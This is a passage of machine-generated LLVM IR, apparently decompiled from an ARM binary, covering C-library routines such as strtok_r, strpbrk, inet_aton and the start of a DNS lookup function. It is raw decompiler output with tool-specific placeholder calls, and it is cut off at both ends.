  %v1_17ae4 = add i32 %v0_17ac050, -1
  %v2_17ae4 = inttoptr i32 %v1_17ae4 to i8*
  %v3_17ae4 = load i8, i8* %v2_17ae4, align 1
  %v4_17ae4 = zext i8 %v3_17ae4 to i32
  %v9_17ae8 = icmp eq i32 %v4_17ae4, %v1_17a88
  %v1_17aec = add i32 %v0_17ac050, -2
  %v1_17af4 = add i32 %v0_17ac050, -3
  store i32 %v1_17af4, i32* @lr, align 4
  br i1 %v9_17ae8, label %dec_label_pc_17afc, label %dec_label_pc_17b04

dec_label_pc_17afc:                               ; preds = %dec_label_pc_17ae4
  store i32 %v3_17a84, i32* @r4, align 4
  ret i32 %v1_17ae4

dec_label_pc_17b04:                               ; preds = %dec_label_pc_17ae4
  %v2_17b04 = inttoptr i32 %v1_17aec to i8*
  %v3_17b04 = load i8, i8* %v2_17b04, align 1
  %v4_17b04 = zext i8 %v3_17b04 to i32
  %v9_17b08 = icmp eq i32 %v4_17b04, %v1_17a88
  br i1 %v9_17b08, label %dec_label_pc_17b10, label %dec_label_pc_17b18

dec_label_pc_17b10:                               ; preds = %dec_label_pc_17b04
  store i32 %v3_17a84, i32* @r4, align 4
  ret i32 %v1_17aec

dec_label_pc_17b18:                               ; preds = %dec_label_pc_17b04
  %v2_17b18 = inttoptr i32 %v1_17af4 to i8*
  %v3_17b18 = load i8, i8* %v2_17b18, align 1
  %v4_17b18 = zext i8 %v3_17b18 to i32
  %v9_17b1c = icmp eq i32 %v4_17b18, %v1_17a88
  br i1 %v9_17b1c, label %dec_label_pc_17b24, label %dec_label_pc_17b2c

dec_label_pc_17b24:                               ; preds = %dec_label_pc_17b18
  store i32 %v3_17a84, i32* @r4, align 4
  ret i32 %v1_17af4

dec_label_pc_17b2c:                               ; preds = %dec_label_pc_17b18
  %v1_17b2c = inttoptr i32 %v1_17ac0 to i8*
  %v2_17b2c = load i8, i8* %v1_17b2c, align 1
  %v3_17b2c = zext i8 %v2_17b2c to i32
  %v9_17b30 = icmp eq i32 %v3_17b2c, %v1_17a88
  br i1 %v9_17b30, label %bb19, label %.backedge.backedge

.backedge.backedge:                               ; preds = %dec_label_pc_17b2c, %dec_label_pc_17ac0
  store i32 -2130640640, i32* @lr, align 4
  %tmp70 = icmp ugt i32 %v1_17adc, 3
  br i1 %tmp70, label %dec_label_pc_17ac0, label %dec_label_pc_17b48

bb19:                                             ; preds = %dec_label_pc_17b2c
  store i32 %v3_17a84, i32* @r4, align 4
  ret i32 %v1_17ac0

dec_label_pc_17b4c:                               ; preds = %dec_label_pc_17b48
  %v1_17b58 = add i32 %v0_17b58, -1
  %v1_17b4c = add i32 %v0_17b4c, -1
  %v2_17b4c = inttoptr i32 %v1_17b4c to i8*
  %v3_17b4c = load i8, i8* %v2_17b4c, align 1
  %v4_17b4c = zext i8 %v3_17b4c to i32
  %v9_17b50 = icmp eq i32 %v4_17b4c, %v1_17a88
  br i1 %v9_17b50, label %bb20, label %dec_label_pc_17b48

bb20:                                             ; preds = %dec_label_pc_17b4c
  store i32 %v3_17a84, i32* @r4, align 4
  ret i32 %v1_17b4c

dec_label_pc_17b48:                               ; preds = %dec_label_pc_17ab4, %.backedge.backedge, %dec_label_pc_17b4c
  %v0_17b4c = phi i32 [ %v1_17b4c, %dec_label_pc_17b4c ], [ %v0_17b4c11, %dec_label_pc_17ab4 ], [ %v1_17ac0, %.backedge.backedge ]
  %v0_17b58 = phi i32 [ %v1_17b58, %dec_label_pc_17b4c ], [ %v0_17b387, %dec_label_pc_17ab4 ], [ %v1_17adc, %.backedge.backedge ]
  %v2_17b58 = icmp eq i32 %v0_17b58, 0
  br i1 %v2_17b58, label %dec_label_pc_17b60, label %dec_label_pc_17b4c

dec_label_pc_17b60:                               ; preds = %dec_label_pc_17b48
  store i32 %v3_17a84, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_17b58, { 1, 0 }
  uselistorder i32 %v1_17adc, { 1, 0, 2 }
  uselistorder i32 %v1_17ac0, { 0, 2, 3, 4, 1 }
  uselistorder i32 %v0_17ac050, { 3, 2, 1, 0 }
  uselistorder i32 %v5_17ab4, { 1, 0 }
  uselistorder i32 %v0_17b387, { 1, 2, 0 }
  uselistorder i32 %v0_17a94, { 1, 0, 2 }
  uselistorder i32 %v1_17a94, { 0, 2, 1, 3 }
  uselistorder i32 %v2_17a8c, { 1, 0 }
  uselistorder i32 %v1_17a88, { 6, 2, 3, 4, 5, 7, 0, 1 }
  uselistorder i32 %v3_17a84, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 -3, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32 %arg3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17b48, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17ac0, { 1, 0 }
  uselistorder label %dec_label_pc_17ab4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_17aac, { 1, 0 }
}

define i32 @strtok_r() local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17b70 = load i32, i32* @r4, align 4
  store i32 %v3_17b70, i32* %stack_var_-16, align 4
  %v6_17b70 = load i32, i32* @r5, align 4
  %v0_17b74 = load i32, i32* @r0, align 4
  store i32 %v0_17b74, i32* %r4.global-to-local, align 4
  %v2_17b74 = icmp eq i32 %v0_17b74, 0
  %v1_17b78 = load i32, i32* @r2, align 4
  br i1 %v2_17b74, label %bb, label %entry._crit_edge

bb:                                               ; preds = %entry
  %v2_17b78 = inttoptr i32 %v1_17b78 to i32*
  %v3_17b78 = load i32, i32* %v2_17b78, align 4
  store i32 %v3_17b78, i32* %r4.global-to-local, align 4
  br label %entry._crit_edge

entry._crit_edge:                                 ; preds = %entry, %bb
  %v0_17b7c = phi i32 [ %v3_17b78, %bb ], [ %v0_17b74, %entry ]
  store i32 %v0_17b7c, i32* @r0, align 4
  store i32 %v1_17b78, i32* @r5, align 4
  %v0_17b84 = load i32, i32* @r1, align 4
  store i32 %v0_17b84, i32* %r6.global-to-local, align 4
  %v1_17b88 = inttoptr i32 %v0_17b7c to i8*
  %v2_17b88 = call i32 @__GI_strspn(i8* %v1_17b88)
  %v0_17b8c = load i32, i32* %r4.global-to-local, align 4
  %v2_17b8c = add i32 %v0_17b8c, %v2_17b88
  %v3_17b8c = inttoptr i32 %v2_17b8c to i8*
  %v4_17b8c = load i8, i8* %v3_17b8c, align 1
  %v6_17b8c = zext i8 %v4_17b8c to i32
  store i32 %v6_17b8c, i32* %r3.global-to-local, align 4
  store i32 %v2_17b8c, i32* @r4, align 4
  %v2_17b94 = icmp eq i8 %v4_17b8c, 0
  store i1 %v2_17b94, i1* @cpsr_z, align 1
  %v0_17b98 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_17b98, i32* @r1, align 4
  store i32 %v2_17b8c, i32* @r0, align 4
  br i1 %v2_17b94, label %bb7, label %dec_label_pc_17ba8

bb7:                                              ; preds = %entry._crit_edge
  %v2_17ba0 = load i32, i32* @r5, align 4
  %v3_17ba0 = inttoptr i32 %v2_17ba0 to i32*
  store i32 %v2_17b8c, i32* %v3_17ba0, align 4
  br label %dec_label_pc_17bdc

dec_label_pc_17ba8:                               ; preds = %entry._crit_edge
  %v0_17ba8 = call i32 @__GI_strpbrk()
  store i32 %v0_17ba8, i32* %r2.global-to-local, align 4
  %v3_17bac = icmp eq i32 %v0_17ba8, 0
  store i1 %v3_17bac, i1* @cpsr_z, align 1
  br i1 %v3_17bac, label %dec_label_pc_17bbc, label %dec_label_pc_17bcc

dec_label_pc_17bbc:                               ; preds = %dec_label_pc_17ba8
  %v0_17bb4 = load i32, i32* @r4, align 4
  %v2_17bbc = call i32 @rawmemchr(i32 %v0_17bb4, i32 0)
  %v0_17bc0 = load i32, i32* @r4, align 4
  store i32 %v0_17bc0, i32* %r3.global-to-local, align 4
  %v1_17bc4 = load i32, i32* @r5, align 4
  %v2_17bc4 = inttoptr i32 %v1_17bc4 to i32*
  store i32 %v2_17bbc, i32* %v2_17bc4, align 4
  br label %dec_label_pc_17bdc

dec_label_pc_17bcc:                               ; preds = %dec_label_pc_17ba8
  %v3_17bd0 = inttoptr i32 %v0_17ba8 to i8*
  store i8 0, i8* %v3_17bd0, align 1
  %v4_17bd0 = load i32, i32* %r2.global-to-local, align 4
  %v5_17bd0 = add i32 %v4_17bd0, 1
  store i32 %v5_17bd0, i32* %r2.global-to-local, align 4
  %v1_17bd4 = load i32, i32* @r5, align 4
  %v2_17bd4 = inttoptr i32 %v1_17bd4 to i32*
  store i32 %v5_17bd0, i32* %v2_17bd4, align 4
  %v0_17bd8 = load i32, i32* @r4, align 4
  store i32 %v0_17bd8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17bdc

dec_label_pc_17bdc:                               ; preds = %bb7, %dec_label_pc_17bbc, %dec_label_pc_17bcc
  %v0_17bdc = load i32, i32* %r3.global-to-local, align 4
  %v2_17be0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17be0, i32* @r4, align 4
  store i32 %v6_17b70, i32* @r5, align 4
  ret i32 %v0_17bdc

; uselistorder directives
  uselistorder i32 %v0_17b7c, { 1, 0 }
  uselistorder i32 %v0_17b74, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_17bdc, { 2, 1, 0 }
  uselistorder label %entry._crit_edge, { 1, 0 }
}

define i32 @__GI_strpbrk() local_unnamed_addr {
entry:
  %v0_17be4 = load i32, i32* @r0, align 4
  %v1_17c082 = inttoptr i32 %v0_17be4 to i8*
  %v2_17c083 = load i8, i8* %v1_17c082, align 1
  %v3_17c084 = zext i8 %v2_17c083 to i32
  %v2_17c0c5 = icmp eq i8 %v2_17c083, 0
  br i1 %v2_17c0c5, label %dec_label_pc_17c08._crit_edge, label %.lr.ph

.lr.ph:                                           ; preds = %entry
  %v0_17c14.pre = load i32, i32* @r1, align 4
  br label %bb

dec_label_pc_17bec:                               ; preds = %dec_label_pc_17bf4
  %v1_17bfc = add i32 %v0_17bfc, 1
  %v9_17bec = icmp eq i32 %v3_17bf4, %v3_17c086
  br i1 %v9_17bec, label %dec_label_pc_17c1c, label %dec_label_pc_17bf4

dec_label_pc_17bf4:                               ; preds = %dec_label_pc_17bec, %bb
  %v0_17bfc = phi i32 [ %v1_17bfc, %dec_label_pc_17bec ], [ %v0_17c14.pre, %bb ]
  %v1_17bf4 = inttoptr i32 %v0_17bfc to i8*
  %v2_17bf4 = load i8, i8* %v1_17bf4, align 1
  %v3_17bf4 = zext i8 %v2_17bf4 to i32
  store i32 %v3_17bf4, i32* @ip, align 4
  %v2_17bf8 = icmp eq i8 %v2_17bf4, 0
  br i1 %v2_17bf8, label %dec_label_pc_17c04, label %dec_label_pc_17bec

dec_label_pc_17c04:                               ; preds = %dec_label_pc_17bf4
  %v1_17c04 = add i32 %v0_17c04, 1
  %v1_17c08 = inttoptr i32 %v1_17c04 to i8*
  %v2_17c08 = load i8, i8* %v1_17c08, align 1
  %v3_17c08 = zext i8 %v2_17c08 to i32
  %v2_17c0c = icmp eq i8 %v2_17c08, 0
  br i1 %v2_17c0c, label %dec_label_pc_17c08._crit_edge, label %bb

dec_label_pc_17c08._crit_edge:                    ; preds = %dec_label_pc_17c04, %entry
  %v3_17c08.lcssa = phi i32 [ %v3_17c084, %entry ], [ %v3_17c08, %dec_label_pc_17c04 ]
  ret i32 %v3_17c08.lcssa

bb:                                               ; preds = %.lr.ph, %dec_label_pc_17c04
  %v0_17c04 = phi i32 [ %v0_17be4, %.lr.ph ], [ %v1_17c04, %dec_label_pc_17c04 ]
  %v3_17c086 = phi i32 [ %v3_17c084, %.lr.ph ], [ %v3_17c08, %dec_label_pc_17c04 ]
  br label %dec_label_pc_17bf4

dec_label_pc_17c1c:                               ; preds = %dec_label_pc_17bec
  ret i32 %v0_17c04

; uselistorder directives
  uselistorder i32 %v3_17c08, { 1, 0 }
  uselistorder i32 %v3_17bf4, { 1, 0 }
  uselistorder i32 %v0_17bfc, { 1, 0 }
  uselistorder i32 %v3_17c084, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
  uselistorder label %dec_label_pc_17bf4, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-20 = alloca i32, align 4
  %v0_17c24 = load i32, i32* %r0.global-to-local, align 4
  %v2_17c24 = icmp eq i32 %v0_17c24, 0
  %v3_17c28 = load i32, i32* @r4, align 4
  store i32 %v3_17c28, i32* %stack_var_-20, align 4
  br i1 %v2_17c24, label %dec_label_pc_17d04, label %dec_label_pc_17c40.lr.ph

dec_label_pc_17c40:                               ; preds = %dec_label_pc_17c40.lr.ph, %dec_label_pc_17cc4
  %v1_17cc4 = phi i32 [ 0, %dec_label_pc_17c40.lr.ph ], [ %v5_17cc4, %dec_label_pc_17cc4 ]
  %v0_17cc8 = phi i32 [ 1, %dec_label_pc_17c40.lr.ph ], [ %v1_17cc8, %dec_label_pc_17cc4 ]
  %v0_17c48 = phi i32 [ %v0_17c24, %dec_label_pc_17c40.lr.ph ], [ %v0_17c4825, %dec_label_pc_17cc4 ]
  store i32 %v2_17c44.pre, i32* @lr, align 4
  %v1_17c48 = inttoptr i32 %v0_17c48 to i8*
  %v2_17c48 = load i8, i8* %v1_17c48, align 1
  %v3_17c48 = zext i8 %v2_17c48 to i32
  %v3_17c4c = mul nuw nsw i32 %v3_17c48, 2
  %v4_17c4c = add i32 %v3_17c4c, %v2_17c44.pre
  %v5_17c4c = inttoptr i32 %v4_17c4c to i8*
  %v6_17c4c = load i8, i8* %v5_17c4c, align 1
  %v1_17c50 = and i8 %v6_17c4c, 8
  %v2_17c50 = icmp eq i8 %v1_17c50, 0
  br i1 %v2_17c50, label %dec_label_pc_17d04, label %dec_label_pc_17c58

dec_label_pc_17c58:                               ; preds = %dec_label_pc_17c40
  br label %dec_label_pc_17c78

dec_label_pc_17c60:                               ; preds = %dec_label_pc_17c78
  %v3_17c64 = mul i32 %v0_17cc4, 10
  %v4_17c64 = add i32 %v3_17c78, %v3_17c64
  %v1_17c68 = add i32 %v4_17c64, -48
  %v8_17c70 = icmp sgt i32 %v1_17c68, 255
  br i1 %v8_17c70, label %dec_label_pc_17d04, label %dec_label_pc_17c74

dec_label_pc_17c74:                               ; preds = %dec_label_pc_17c60
  %v1_17c74 = add i32 %v0_17cb4, 1
  store i32 %v1_17c74, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17c78

dec_label_pc_17c78:                               ; preds = %dec_label_pc_17c58, %dec_label_pc_17c74
  %v0_17cc4 = phi i32 [ 0, %dec_label_pc_17c58 ], [ %v1_17c68, %dec_label_pc_17c74 ]
  %v0_17cb4 = phi i32 [ %v0_17c48, %dec_label_pc_17c58 ], [ %v1_17c74, %dec_label_pc_17c74 ]
  %v1_17c78 = inttoptr i32 %v0_17cb4 to i8*
  %v2_17c78 = load i8, i8* %v1_17c78, align 1
  %v3_17c78 = zext i8 %v2_17c78 to i32
  %v2_17c7c = mul nuw nsw i32 %v3_17c78, 2
  %v2_17c80 = add i32 %v2_17c7c, %v2_17c44.pre
  %v3_17c84 = inttoptr i32 %v2_17c80 to i8*
  %v4_17c84 = load i8, i8* %v3_17c84, align 1
  %v6_17c84 = zext i8 %v4_17c84 to i32
  %v1_17c90 = and i32 %v6_17c84, 8
  %v2_17c90 = icmp eq i32 %v1_17c90, 0
  br i1 %v2_17c90, label %dec_label_pc_17c98, label %dec_label_pc_17c60

dec_label_pc_17c98:                               ; preds = %dec_label_pc_17c78
  %v8_17c9c = icmp sgt i32 %v0_17cc8, 3
  br i1 %v8_17c9c, label %dec_label_pc_17cb0, label %dec_label_pc_17ca0

dec_label_pc_17ca0:                               ; preds = %dec_label_pc_17c98
  %v7_17ca0 = icmp eq i8 %v2_17c78, 46
  br i1 %v7_17ca0, label %dec_label_pc_17ca8, label %dec_label_pc_17d04

dec_label_pc_17ca8:                               ; preds = %dec_label_pc_17ca0
  %v1_17ca8 = add i32 %v0_17cb4, 1
  store i32 %v1_17ca8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17cc4

dec_label_pc_17cb0:                               ; preds = %dec_label_pc_17c98
  %v2_17cb0 = icmp eq i8 %v2_17c78, 0
  %v1_17cb4 = add i32 %v0_17cb4, 1
  store i32 %v1_17cb4, i32* %r0.global-to-local, align 4
  br i1 %v2_17cb0, label %dec_label_pc_17cc4, label %dec_label_pc_17cbc

dec_label_pc_17cbc:                               ; preds = %dec_label_pc_17cb0
  %v1_17cbc = and i32 %v6_17c84, 32
  %v2_17cbc = icmp eq i32 %v1_17cbc, 0
  br i1 %v2_17cbc, label %dec_label_pc_17d04, label %dec_label_pc_17cc4

dec_label_pc_17cc4:                               ; preds = %dec_label_pc_17cbc, %dec_label_pc_17cb0, %dec_label_pc_17ca8
  %v0_17c4825 = phi i32 [ %v1_17cb4, %dec_label_pc_17cbc ], [ %v1_17cb4, %dec_label_pc_17cb0 ], [ %v1_17ca8, %dec_label_pc_17ca8 ]
  %v4_17cc4 = mul i32 %v1_17cc4, 256
  %v5_17cc4 = or i32 %v0_17cc4, %v4_17cc4
  %v1_17cc8 = add nuw nsw i32 %v0_17cc8, 1
  %v7_17cd0 = icmp slt i32 %v1_17cc8, 5
  br i1 %v7_17cd0, label %dec_label_pc_17c40, label %dec_label_pc_17cd4

dec_label_pc_17c40.lr.ph:                         ; preds = %entry
  %v2_17c44.pre = load i32, i32* @global_var_2d288, align 4
  br label %dec_label_pc_17c40

dec_label_pc_17cd4:                               ; preds = %dec_label_pc_17cc4
  %v2_17cd4 = icmp eq i32 %arg2, 0
  br i1 %v2_17cd4, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_17cd4
  store i32 1, i32* %r0.global-to-local, align 4
  br label %.thread11

bb41:                                             ; preds = %dec_label_pc_17cd4
  %v3_17cf0 = call i32 @llvm.bswap.i32(i32 %v5_17cc4)
  store i32 1, i32* %r0.global-to-local, align 4
  %v3_17cfc = inttoptr i32 %arg2 to i32*
  store i32 %v3_17cf0, i32* %v3_17cfc, align 4
  %v2_17d00.pre = load i32, i32* %stack_var_-20, align 4
  %v17_17d00.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread11

.thread11:                                        ; preds = %bb, %bb41
  %v17_17d00 = phi i32 [ 1, %bb ], [ %v17_17d00.pre, %bb41 ]
  %v2_17d00 = phi i32 [ %v3_17c28, %bb ], [ %v2_17d00.pre, %bb41 ]
  store i32 %v2_17d00, i32* @r4, align 4
  ret i32 %v17_17d00

dec_label_pc_17d04:                               ; preds = %dec_label_pc_17ca0, %dec_label_pc_17cbc, %dec_label_pc_17c40, %dec_label_pc_17c60, %entry
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v3_17c28, i32* @r4, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_17c44.pre, { 2, 1, 0 }
  uselistorder i32 %v1_17cc8, { 1, 0 }
  uselistorder i32 %v0_17cb4, { 0, 1, 3, 2 }
  uselistorder i32 %v3_17c28, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 3, 5, 6, 7, 8, 0, 1 }
  uselistorder label %dec_label_pc_17d04, { 1, 0, 3, 2, 4 }
  uselistorder label %.thread11, { 1, 0 }
  uselistorder label %dec_label_pc_17c78, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp146 = call i32 @__decompiler_undefined_function_0()
  %tmp147 = call i32 @__decompiler_undefined_function_0()
  %tmp151 = call i32 @__decompiler_undefined_function_0()
  %tmp155 = call i32 @__decompiler_undefined_function_0()
  %tmp156 = call i32 @__decompiler_undefined_function_0()
  %tmp157 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-100 = alloca i8, align 1
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-188 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-236 = alloca i32, align 4
  %v3_17d10 = load i32, i32* @r4, align 4
  %v6_17d10 = load i32, i32* @r5, align 4
  %v9_17d10 = load i32, i32* @r6, align 4
  %v12_17d10 = load i32, i32* @r7, align 4
  %v15_17d10 = load i32, i32* @r8, align 4
  %v18_17d10 = load i32, i32* @sb, align 4
  %v21_17d10 = load i32, i32* @sl, align 4
  store i32 %arg6, i32* @r8, align 4
  %v1_17d30 = call i32 @malloc(i32 512)
  store i32 %v1_17d30, i32* @r7, align 4
  %v1_17d3c = call i32 @malloc(i32 1025)
  %v2_17d40 = icmp eq i32 %v1_17d3c, 0
  br i1 %v2_17d40, label %.thread8, label %bb

bb:                                               ; preds = %entry
  %v1_17d44 = load i32, i32* @r7, align 4
  %v3_17d44 = icmp eq i32 %v1_17d44, 0
  store i32 %v1_17d3c, i32* %stack_var_-236, align 4
  br i1 %v3_17d44, label %bb195, label %dec_label_pc_17d58

.thread8:                                         ; preds = %entry
  store i32 0, i32* %stack_var_-236, align 4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_18438

bb195:                                            ; preds = %bb
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_18438

dec_label_pc_17d58:                               ; preds = %bb
  store i32 0, i32* @r5, align 4
  %v2_17d5c = icmp eq i32 %arg3, 0
  br i1 %v2_17d5c, label %dec_label_pc_18438, label %dec_label_pc_17d64

dec_label_pc_17d64:                               ; preds = %dec_label_pc_17d58
  %v2_17d68 = load i8, i8* %arg1, align 1
  %v2_17d6c = icmp eq i8 %v2_17d68, 0
  br i1 %v2_17d6c, label %dec_label_pc_18438, label %dec_label_pc_17d74

dec_label_pc_17d74:                               ; preds = %dec_label_pc_17d64
  %v3_17d78 = call i32 @strlen(i8* nonnull %arg1)
  %v2_17d80 = add i32 %v3_17d78, %tmp
  %v1_17d84 = add i32 %v2_17d80, -1
  %v2_17d84 = inttoptr i32 %v1_17d84 to i8*
  %v3_17d84 = load i8, i8* %v2_17d84, align 1
  %v2_17d88 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_17d88, i32* @r4, align 4
  %v7_17d8c = icmp eq i8 %v3_17d84, 46
  %. = zext i1 %v7_17d8c to i32
  store i32 %v2_17d88, i32* @r0, align 4
  %v1_17db0 = call i32 @__pthread_return_void()
  %v1_17dc0 = call i32 @__pthread_return_0()
  %v2_17dcc = load i32, i32* @global_var_33878.1298, align 4
  %v2_17dd0 = srem i32 %v2_17dcc, %arg3
  %v3_17dd8 = load i8, i8* @global_var_2d5c9.1301, align 1
  %v4_17dd8 = zext i8 %v3_17dd8 to i32
  %v2_17ddc = load i8, i8* bitcast (i8** @global_var_2d5c8.1300 to i8*), align 4
  %v3_17ddc = zext i8 %v2_17ddc to i32
  %v4_17de4 = mul nuw nsw i32 %v4_17dd8, 256
  %v5_17de4 = or i32 %v3_17ddc, %v4_17de4
  store i32 %v5_17de4, i32* @sb, align 4
  store i32 %v2_17dd0, i32* @sl, align 4
  store i32 %v2_17d88, i32* @r0, align 4
  %v1_17df8 = call i32 @__pthread_return_void()
  %v0_17e04 = load i32, i32* @r5, align 4
  %v2_17e24 = ptrtoint i8* %stack_var_-188 to i32
  %v6_17e68 = bitcast i8* %stack_var_-188 to i32*
  %v2_17f48 = ptrtoint i32* %stack_var_-92 to i32
  %v3_17fe0 = bitcast i8* %stack_var_-100 to %sockaddr*
  %v10_18044 = bitcast i32* %stack_var_-44 to %pollfd*
  %v2_18390 = icmp eq i1 %v7_17d8c, false
  %v7_18098 = icmp eq i32 %tmp156, 3
  %tmp198 = icmp slt i32 %tmp155, 1
  %v2_1817c = ptrtoint i32* %stack_var_-140 to i32
  %v9_18274 = icmp eq i32 %tmp147, %arg2
  %v7_18208 = icmp eq i32 %arg2, 1
  %v2_181b0 = icmp eq i32 %tmp151, 0
  %tmp292 = icmp ult i32 %v0_17e04, 3
  br i1 %tmp292, label %dec_label_pc_17e0c.lr.ph.preheader.lr.ph, label %dec_label_pc_18444

dec_label_pc_17e0c.lr.ph.preheader.lr.ph:         ; preds = %dec_label_pc_17d74
  %v2_1811c = icmp eq i32 %tmp156, 0
  %v8_1820c = icmp eq i32 %arg2, 28
  br label %dec_label_pc_17e0c.lr.ph.preheader

dec_label_pc_17e0c:                               ; preds = %dec_label_pc_17e0c.lr.ph, %dec_label_pc_18428.backedge
  %v1_17e14 = phi i32 [ %stack_var_-216.1.ph84, %dec_label_pc_17e0c.lr.ph ], [ %v0_17fbc, %dec_label_pc_18428.backedge ]
  %stack_var_-208.567 = phi i32 [ %stack_var_-208.5.ph83, %dec_label_pc_17e0c.lr.ph ], [ %stack_var_-208.5.be, %dec_label_pc_18428.backedge ]
  %v7_17e10 = icmp eq i32 %v1_17e14, -1
  br i1 %v7_17e10, label %bb200, label %bb199

bb199:                                            ; preds = %dec_label_pc_17e0c
  br label %bb200

bb200:                                            ; preds = %dec_label_pc_17e0c, %bb199
  %v1_17e18 = xor i1 %v7_17e10, true
  call void @__pseudo_cond_branch(i1 %v1_17e18, i32 ptrtoint (i32* @global_var_11ce8.1303 to i32))
  store i32 512, i32* @r2, align 4
  store i32 %v2_17e24, i32* @r4, align 4
  %v0_17e28 = load i32, i32* @r7, align 4
  %v2_17e2c = inttoptr i32 %v0_17e28 to i8*
  %v3_17e2c = call i32 @__GI_memset(i8* %v2_17e2c, i32 0)
  store i32 48, i32* @r2, align 4
  %v3_17e3c = call i32 @__GI_memset(i8* nonnull %stack_var_-188, i32 0)
  %v0_17e40 = load i32, i32* @sb, align 4
  %v1_17e40 = add i32 %v0_17e40, 1
  %v3_17e48 = urem i32 %v1_17e40, 65536
  store i32 %v3_17e48, i32* @sb, align 4
  %v0_17e54 = load i32, i32* @r7, align 4
  %v5_17e60 = trunc i32 %v1_17e40 to i8
  store i8 %v5_17e60, i8* %stack_var_-188, align 1
  %v7_17e68 = call i32 @__encode_header(i32* %v6_17e68, i32 %v0_17e54, i32 512, i32 1, i32 %v1_17e40)
  store i32 %v7_17e68, i32* @r5, align 4
  %v1_17e6c = icmp slt i32 %v7_17e68, 0
  br i1 %v1_17e6c, label %dec_label_pc_18444, label %dec_label_pc_17e74

dec_label_pc_17e74:                               ; preds = %bb200
  store i32 %tmp, i32* @r1, align 4
  %v2_17e7c = load i32, i32* %stack_var_-236, align 4
  %v4_17e80 = call i32 @strncpy(i32 %v2_17e7c, i32 %tmp, i32 1025)
  store i32 %v2_17d88, i32* @r0, align 4
  %v1_17e98 = call i32 @__pthread_return_void()
  %v1_17ea8 = call i32 @__pthread_return_0()
  %v1_17eb8 = load i32, i32* @sl, align 4
  %v4_17eb8 = mul i32 %v1_17eb8, 4
  %v5_17eb8 = add i32 %v4_17eb8, %arg4
  %v6_17eb8 = inttoptr i32 %v5_17eb8 to i32*
  %v7_17eb8 = load i32, i32* %v6_17eb8, align 4
  store i32 %v7_17eb8, i32* @r6, align 4
  br i1 %v1_17eb4, label %dec_label_pc_17efc, label %dec_label_pc_17ec0

dec_label_pc_17ec0:                               ; preds = %dec_label_pc_17e74
  %v2_17ec8 = load i32, i32* @global_var_33948.1306, align 4
  %v6_17ed0 = icmp slt i32 %v6_183ec, %v2_17ec8
  br i1 %v6_17ed0, label %dec_label_pc_17ed4, label %dec_label_pc_17efc

dec_label_pc_17ed4:                               ; preds = %dec_label_pc_17ec0
  store i32 ptrtoint (i32* @global_var_24e94.1308 to i32), i32* @r1, align 4
  %v2_17edc = load i32, i32* %stack_var_-236, align 4
  %v4_17ee0 = inttoptr i32 %v2_17edc to i8*
  %v5_17ee0 = call i32 @__GI_strncat(i8* %v4_17ee0, i32 ptrtoint (i32* @global_var_24e94.1308 to i32), i32 1025, i32 %v2_17ec8)
  %v7_17ef0 = load i32, i32* %v6_17ef0, align 4
  store i32 %v7_17ef0, i32* @r1, align 4
  %v4_17ef8 = inttoptr i32 %v2_17edc to i8*
  %v5_17ef8 = call i32 @__GI_strncat(i8* %v4_17ef8, i32 %v7_17ef0, i32 1025, i32 ptrtoint (i32* @global_var_33928.1310 to i32))
  br label %dec_label_pc_17efc

dec_label_pc_17efc:                               ; preds = %dec_label_pc_17ec0, %dec_label_pc_17e74, %dec_label_pc_17ed4
  store i32 %v2_17d88, i32* @r0, align 4
  store i32 98064, i32* @lr, align 4
  %v1_17f0c = call i32 @__pthread_return_void()
  %v2_17f18 = load i32, i32* %stack_var_-236, align 4
  store i32 %v2_17f18, i32* %stack_var_-56, align 4
  %v0_17f28 = load i32, i32* @r7, align 4
  %v1_17f28 = load i32, i32* @r5, align 4
  %v2_17f28 = add i32 %v1_17f28, %v0_17f28
  %v1_17f2c = sub i32 512, %v1_17f28
  %v8_17f34 = call i32 @__encode_question(i32* nonnull %stack_var_-56, i32 %v2_17f28, i32 %v1_17f2c, i32 %arg2, i32 %v2_17f18, i32 %arg2, i32 1)
  store i32 %v8_17f34, i32* @fp, align 4
  %v1_17f38 = icmp slt i32 %v8_17f34, 0
  br i1 %v1_17f38, label %dec_label_pc_18444, label %dec_label_pc_17f40

